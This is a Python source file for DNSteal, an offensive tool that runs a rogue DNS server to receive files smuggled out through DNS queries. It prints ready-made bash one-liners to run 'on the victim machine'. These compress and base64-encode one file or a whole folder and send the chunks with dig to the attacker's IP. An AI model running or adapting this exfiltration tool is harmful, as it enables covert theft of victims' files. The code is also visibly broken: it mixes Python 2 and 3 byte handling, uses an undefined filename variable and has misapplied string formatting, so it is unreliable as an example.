#!/usr/bin/env python
#  g0dmode
########################

import base64
import binascii
import hashlib
import re
import socket
import sys
import time
import zlib

c = {
    "r": "\033[1;31m",
    "g": "\033[1;32m",
    "y": "\033[1;33m",
    "b": "\033[1;34m",
    "e": "\033[0m",
}
VERSION = "2.0"

DNS_QUESTION_INDEX = 12


def first_rr_index(dns):
    """Get the index of the first resource record of an dns message."""
    # header takes up 12 bytes
    i = DNS_QUESTION_INDEX
    # skip the qname
    # QNAME is in domain format: [len]label,[len]label,...,0
    label_len = ord(dns[i])
    while label_len != 0:
        i += label_len + 1
        label_len = ord(dns[i])
    # skip the last null-label, the qtype and qclass
    i += 5
    return i


def test_first_rr_index():
    dns = (
        "\x00\x00\x00\x00"
        + "\x00\x01"
        + "\x00\x00"
        + "\x00\x00"
        + "\x00\x00"
        + "\x06google\x02de\x00"
        + "\x00\x00"
        + "\x00\x00"
    )

    i = first_rr_index(dns)
    assert i == 27

    dns = (
        "\x00\x00\x00\x00"
        + "\x00\x01"
        + "\x00\x00"
        + "\x00\x00"
        + "\x00\x00"
        + "\x00"
        + "\x00\x00"
        + "\x00\x00"
    )
    i = first_rr_index(dns)
    assert i == 17


class DNSQuery:
    def __init__(self, data):
        self.data = data
        self.data_text = ""

        tipo = (ord(data[2]) >> 3) & 15  # Opcode bits
        if tipo == 0:  # Standard query
            ini = 12
            lon = ord(data[ini])
        while lon != 0:
            self.data_text += data[ini + 1 : ini + lon + 1] + "."
            ini += lon + 1
            lon = ord(data[ini])

    def request(self, ip):
        packet = ""
        rr_i = first_rr_index(self.data)
        if self.data_text:
            packet += self.data[:2] + "\x81\x80"
            packet += (
                self.data[4:6] + "\x00\x01" + self.data[8:12]
            )  # Questions and Answers Counts
            packet += self.data[12:rr_i]  # Original Domain Name Question
            packet += "\xc0\x0c"  # Pointer to domain name
            packet += "\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04"  # Response type, ttl and resource data length -> 4 bytes
            packet += str.join("", [chr(int(x)) for x in ip.split(".")])  # 4bytes of IP
            packet += self.data[rr_i:]
        return packet


def save_to_file(r_data, z, v):

    print("\n")

    for key, value in r_data.items():

        file_seed = time.strftime("%Y-%m-%d_%H-%M-%S")
        # fname = f"received_{file_seed}_{key}"
        flatdata = ""

        if not value:
            if v:
                print(
                    (
                        "Skipping reassembly of file {}, since no payload was received.".format(
                            fname
                        )
                    )
                )
            continue

        if v:
            print(("Reassembling {} from {}".format(fname, value)))

        try:
            for i in range(0, max(value.keys()) + 1):
                for block in value[i]:
                    fixed_block = block[:-1].replace("*", "+")
                    flatdata += fixed_block
        except KeyError as key_error:
            print(f"{c['r']}[Error]{c['e']} Missing index {key_error} of file '{key}'.")

        # for index, block in value.items():
        #     flatdata += block[:-1].replace("*", "+") # fix data (remove hyphens at end, replace * with + because of dig!)

        #        print flatdata

        try:
            f = open(fname, "wb")
        except Exception:
            print(f"{c['r']}[Error]{c['e']} Opening file '{fname}' to save data.")
            exit(1)
        try:
            if v:
                print(
                    f"{c['y']}[Info]{c['e']} base64 decoding data ({key})."
                    % (c["y"], c["e"], key)
                )
            flatdata = base64.b64decode(
                flatdata
            )  # test if padding correct by using a try/catch
        except Exception:
            f.close()
            print(
                "%s[Error]%s Incorrect padding on base64 encoded data.."
                % (c["r"], c["e"])
            )
            exit(1)

        if z:
            if v:
                print("%s[Info]%s Unzipping data (%s)." % (c["y"], c["e"], key))

            try:
                x = zlib.decompressobj(16 + zlib.MAX_WBITS)
                flatdata = x.decompress(flatdata)
            except:
                print(
                    "%s[Error]%s Could not unzip data, did you specify the -z switch ?"
                    % (c["r"], c["e"])
                )
                exit(1)

                print(
                    "%s[Info]%s Saving received bytes to './%s'"
                    % (c["y"], c["e"], fname)
                )
            f.write(flatdata)
            f.close()
        else:
            print("%s[Info]%s Saving bytes to './%s'" % (c["y"], c["e"], fname))
            f.write(flatdata)
            f.close()

        print(
            "%s[md5sum]%s '%s'\n"
            % (c["g"], c["e"], hashlib.md5(open(fname, "r").read()).hexdigest())
        )


def usage(str=""):

    banner()
    print("Usage: python %s [listen_address] [options]" % sys.argv[0])
    print("\nOptions:")
    print("\t-z\tUnzip incoming files.")
    print("\t-v\tVerbose output.")
    print("\t-h\tThis help menu")
    print()
    print("Advanced:")
    print("\t-b\tBytes to send per subdomain                 (default = 57, max=63)")
    print(
        "\t-s\tNumber of data subdomains per request       (default =  4, ie. $data.$data.$data.$data.$filename)"
    )
    print("\t-f\tLength reserved for filename per request    (default = 17)")
    print()
    print("%s$ python %s -z 127.0.0.1%s" % (c["g"], sys.argv[0], c["e"]))
    print()
    print(
        "%s-------- Do not change the parameters unless you understand! --------%s"
        % (c["r"], c["e"])
    )
    print()
    print("The query length cannot exceed 253 bytes. This is including the filename.")
    print("The subdomains lengths cannot exceed 63 bytes.")
    print()
    print("Advanced: ")
    print(
        "\t%s 127.0.0.1 -z -s 4 -b 57 -f 17\t4 subdomains, 57 bytes => (57 * 4 = 232 bytes) + (4 * '.' = 236). Filename => 17 byte(s)"
        % sys.argv[0]
    )
    print(
        "\t%s 127.0.0.1 -z -s 4 -b 55 -f 29\t4 subdomains, 55 bytes => (55 * 4 = 220 bytes) + (4 * '.' = 224). Filename => 29 byte(s)"
        % sys.argv[0]
    )
    print(
        "\t%s 127.0.0.1 -z -s 4 -b 63 -f  1\t4 subdomains, 63 bytes => (62 * 4 = 248 bytes) + (4 * '.' = 252). Filename =>  1 byte(s)"
        % sys.argv[0]
    )
    print()
    print(str)


def p_cmds(s, b, ip, z):

    print(
        "%s[+]%s On the victim machine, use any of the following commands:"
        % (c["g"], c["e"])
    )
    print(
        "%s[+]%s Remember to set %sfilename%s for individual file transfer."
        % (c["g"], c["e"], c["y"], c["e"])
    )
    print()

    if z:
        print("%s[?]%s Copy individual file (ZIP enabled)" % (c["y"], c["e"]))
        print(
            """\t%s\x23%s %sf=file.txt%s; s=%s;b=%s;c=0;ix=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{$b\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne 3x6-.${ix}-.$r$f|tr "+" "*"` +short;ix=$(($ix+1)); done """
            % (c["r"], c["e"], c["y"], c["e"], s, b, ip)
        )
        print()
        print("%s[?]%s Copy entire folder (ZIP enabled)" % (c["y"], c["e"]))
        print(
            """\t%s\x23%s for f in $(ls .); do s=%s;b=%s;c=0;ix=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{$b\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne 3x6-.${ix}-.$r$f|tr "+" "*"` +short;ix=$(($ix+1)); done ; done"""
            % (c["r"], c["e"], s, b, ip)
        )
        print()
    else:
        print("%s[?]%s Copy individual file" % (c["y"], c["e"]))
        print(
            """\t%s\x23%s %sf=file.txt%s; s=%s;b=%s;c=0;ix=0; for r in $(for i in $(base64 -w0 $f| sed "s/.\{$b\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne 3x6-.${ix}-.$r$f|tr "+" "*"` +short;ix=$(($ix+1)); done """
            % (c["r"], c["e"], c["y"], c["e"], s, b, ip)
        )
        print()
        print("%s[?]%s Copy entire folder" % (c["y"], c["e"]))
        print(
            """\t%s\x23%s for f in $(ls .); do s=%s;b=%s;c=0;ix=0; for r in $(for i in $(base64 -w0 $f | sed "s/.\{$b\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne 3x6-.${ix}-.$r$f|tr "+" "*"` +short; ix=$(($ix+1)); done ; done"""
            % (c["r"], c["e"], s, b, ip)
        )
        print()


def banner():

    print("\033[1;32m", end=" ")
    print(
        """
      ___  _  _ ___ _            _
     |   \| \| / __| |_ ___ __ _| |
     | |) | .` \__ \  _/ -_) _` | |
     |___/|_|\_|___/\__\___\__,_|_|v%s

-- https://github.com/m57/dnsteal.git --\033[0m

Stealthy file extraction via DNS requests
"""
        % VERSION
    )


if __name__ == "__main__":
    ###########################

    z = False
    s = 4
    b = 57
    flen = 17
    v = False
    regx_ip = "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"

    if "-h" in sys.argv or len(sys.argv) < 2:
        usage()
        exit(1)

    ip = sys.argv[1]

    if re.match(regx_ip, ip) == None:
        usage("%s[Error]%s First argument must be listen address." % (c["r"], c["e"]))
        exit(1)

    if "-z" in sys.argv:
        z = True
    if "-s" in sys.argv:
        s = int(sys.argv[sys.argv.index("-s") + 1])
    if "-b" in sys.argv:
        b = int(sys.argv[sys.argv.index("-b") + 1])
    if "-f" in sys.argv:
        flen = int(sys.argv[sys.argv.index("-f") + 1])
    if "-v" in sys.argv:
        v = True

    magic_nr_size = 4
    max_index = 5
    if (
        (b > 63)
        or ((b * s) > 253)
        or (((b * s) + flen + magic_nr_size + max_index) > 253)
    ):
        usage(
            "%s[Error]%s Entire query cannot be > 253. Read help (-h)"
            % (c["r"], c["e"])
        )

    ############################################################################################
    banner()

    udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    try:
        udp.bind((ip, 53))
    except:
        print("%s[Error]%s Cannot bind to address %s:53" % (c["r"], c["e"], ip))
        exit(1)

    print("%s[+]%s DNS listening on '%s:53'" % (c["g"], c["e"], ip))
    p_cmds(s, b, ip, z)
    print(
        "%s[+]%s Once files have sent, use Ctrl+C to exit and save.\n"
        % (c["g"], c["e"])
    )

    try:
        r_data = {}  # map of: file-name -> (map of: index -> transmitted data)
        while 1:
            # There is a bottle neck in this function, if very slow PC, will take
            # slightly longer to send as this main loop recieves the data from victim.

            data, addr = udp.recvfrom(1024)
            p = DNSQuery(data)
            udp.sendto(p.request(ip), addr)

            req_split = p.data_text.split(".")
            req_split.pop()  # fix trailing dot... cba to fix this

            dlen = len(req_split)
            fname = ""
            tmp_data = []

            for n in range(0, dlen):
                if req_split[n][len(req_split[n]) - 1] == "-":
                    tmp_data.append(req_split[n])
                else:
                    # Filename
                    fname += req_split[n] + "."

            fname = fname[:-1]

            if fname not in r_data:
                r_data[fname] = {}

            if len(tmp_data) < 2:
                if v:
                    print(
                        (
                            "Skipping packet: {} since it does have less than 2 payloads".format(
                                req_split
                            )
                        )
                    )
                continue

            magic_nr = tmp_data[0]
            if magic_nr != "3x6-":
                if v:
                    print(
                        (
                            "Skipping packet: {} since it does not have magic nr 3x6)".format(
                                req_split
                            )
                        )
                    )
                continue

            try:
                index = int(tmp_data[1].rstrip("-"))
            except ValueError as err:
                # This should usually not happen
                if v:
                    print(
                        (
                            "Skipping packet: {} since its index was not a number".format(
                                req_split
                            )
                        )
                    )
                continue

            print(
                "%s[>]%s len: '%d bytes'\t- %s"
                % (c["y"], c["e"], len(p.data_text), fname)
            )
            if v:
                print("%s[>>]%s %s -> %s:53" % (c["b"], c["e"], p.data_text, ip))

            r_data[fname][index] = tmp_data[2:]  # first 2 packets are not payload

            # print r_data

    except KeyboardInterrupt:
        save_to_file(r_data, z, v)
        print("\n\033[1;31m[!]\033[0m Closing...")
        udp.close()
